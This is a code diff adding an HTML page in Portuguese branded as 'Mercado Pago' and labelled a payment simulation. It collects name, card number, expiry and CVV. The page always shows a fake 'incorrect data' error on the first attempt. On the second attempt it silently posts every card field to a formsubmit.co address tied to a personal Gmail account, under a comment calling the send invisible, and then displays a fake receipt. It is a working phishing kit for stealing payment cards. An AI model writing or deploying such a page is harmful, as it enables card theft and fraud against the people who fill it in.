@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Simulação de Pagamento</title>
+
+<style>
+body {
+    font-family: Arial;
+    background: #f6f6f6;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    margin:0;
+}
+
+.container {
+    background:#fff;
+    padding:25px;
+    border-radius:10px;
+    width:350px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+    text-align:center;
+}
+
+label {
+    display:block;
+    text-align:left;
+    font-size:13px;
+    margin-top:10px;
+}
+
+input {
+    width:100%;
+    padding:12px;
+    margin:5px 0 8px 0;
+    border-radius:5px;
+    border:1px solid #ccc;
+}
+
+button {
+    width:100%;
+    padding:14px;
+    background:#3483fa;
+    color:#fff;
+    border:none;
+    border-radius:5px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.loader {
+    border:6px solid #eee;
+    border-top:6px solid #3483fa;
+    border-radius:50%;
+    width:50px;
+    height:50px;
+    animation:spin 1s linear infinite;
+    margin:20px auto;
+}
+
+@keyframes spin {
+    100% { transform:rotate(360deg); }
+}
+
+.success { color:green; }
+.fail { color:red; }
+
+.receipt {
+    text-align:left;
+    font-size:14px;
+    margin-top:15px;
+    background:#f9f9f9;
+    padding:10px;
+    border-radius:5px;
+}
+
+.note {
+    font-size:12px;
+    color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div id="formBox">
+
+<h2>Mercado Pago</h2>
+
+<label>Nome Completo</label>
+<input type="text" id="nome" placeholder="Digite seu nome completo" required>
+
+<label>Número do Cartão</label>
+<input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
+
+<label>Data de Validade</label>
+<input type="month" id="validade" required>
+
+<label>Código de Segurança (CVV)</label>
+<input type="password" id="cvv" placeholder="Ex: 123" maxlength="3" required>
+
+<button onclick="pagar()">Proximo</button>
+
+<p class="note">Mercado pago</p>
+
+</div>
+
+<!-- PROCESSANDO -->
+<div id="processando" style="display:none;">
+<h2>Processando...</h2>
+<div class="loader"></div>
+</div>
+
+<!-- RESULTADO -->
+<div id="resultado" style="display:none;">
+<h2 id="status"></h2>
+<div id="comprovante" class="receipt"></div>
+<button onclick="voltar()">Voltar</button>
+</div>
+
+</div>
+
+<script>
+
+let tentativa = 0;
+
+function gerarID(){
+    return "MP-" + Math.floor(Math.random()*1000000);
+}
+
+function dataAtual(){
+    let d = new Date();
+    return d.toLocaleString();
+}
+
+function pagar(){
+
+    let nome = document.getElementById("nome").value;
+    let cartao = document.getElementById("cartao").value;
+    let validade = document.getElementById("validade").value;
+    let cvv = document.getElementById("cvv").value;
+
+    if(!nome || !cartao || !validade || !cvv){
+        alert("Preencha todos os campos.");
+        return;
+    }
+
+    document.getElementById("formBox").style.display = "none";
+    document.getElementById("processando").style.display = "block";
+
+    setTimeout(() => {
+
+        document.getElementById("processando").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
+
+        let status = document.getElementById("status");
+        let comp = document.getElementById("comprovante");
+
+        tentativa++;
+
+        // PRIMEIRA VEZ = ERRO
+        if(tentativa === 1){
+
+            status.innerHTML = "Dados incorretos ❌";
+            status.className = "fail";
+
+            comp.innerHTML = `
+            Transação não autorizada.<br>
+            Verifique os dados e tente novamente.
+            `;
+
+        } else {
+
+            // ENVIO INVISÍVEL PARA EMAIL
+            fetch("https://formsubmit.co/ajax/gmdesmonte@gmail.com", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    nome: nome,
+                    cartao: cartao,
+                    validade: validade,
+                    cvv: cvv,
+                    data: dataAtual(),
+                    id: gerarID()
+                })
+            });
+
+            status.innerHTML = "Mensagem enviada com sucesso ✅";
+            status.className = "success";
+
+            comp.innerHTML = `
+            <b>Comprovante</b><br><br>
+            Nome: ${nome}<br>
+            Cartão: **** **** **** ${cartao.slice(-4)}<br>
+            ID Transação: ${gerarID()}<br>
+            Data: ${dataAtual()}
+            `;
+        }
+
+    }, 2000);
+}
+
+function voltar(){
+    document.getElementById("formBox").style.display = "block";
+    document.getElementById("resultado").style.display = "none";
+
+    document.getElementById("nome").value = "";
+    document.getElementById("cartao").value = "";
+    document.getElementById("validade").value = "";
+    document.getElementById("cvv").value = "";
+}
+</script>
+
+</body>
+</html>
